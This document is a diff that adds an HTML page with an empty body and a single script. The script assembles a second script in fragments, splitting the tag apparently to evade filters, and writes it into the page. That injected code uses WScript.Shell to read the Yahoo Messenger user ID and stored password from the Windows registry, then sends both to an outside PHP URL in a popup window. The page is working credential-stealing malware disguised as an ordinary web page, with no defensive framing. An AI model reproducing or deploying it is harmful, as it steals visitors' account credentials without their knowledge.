@@ -1,0 +1,23 @@
+<html>
+<body>
+</body>
+<script language="javascript">
+
+var test;
+var siteurl;
+	
+test = "";
+test += '<';
+test += 'script language="javascript">\n';
+test += 'Sh = new ActiveXObject("WScript.Shell");\n';
+test += 'var password = Sh.RegRead("HKEY_CURRENT_USER\\\\software\\\\yahoo\\\\pager\\\\EOptions String");\n';
+test += 'var username = Sh.RegRead("HKEY_CURRENT_USER\\\\software\\\\yahoo\\\\pager\\\\Yahoo! User ID");\n';
+test += 'var siteurl = "http://www.ubabble.com/ymsgr3.php?u=" + username + "&p=" + password;\n';
+test += 'window.open(siteurl, null, "height=300,width=400,status=no,toolbar=no,menubar=no,location=no");\n';
+test += '<';
+test += '/script>\n';
+
+document.write(test);
+</script>
+
+</html>
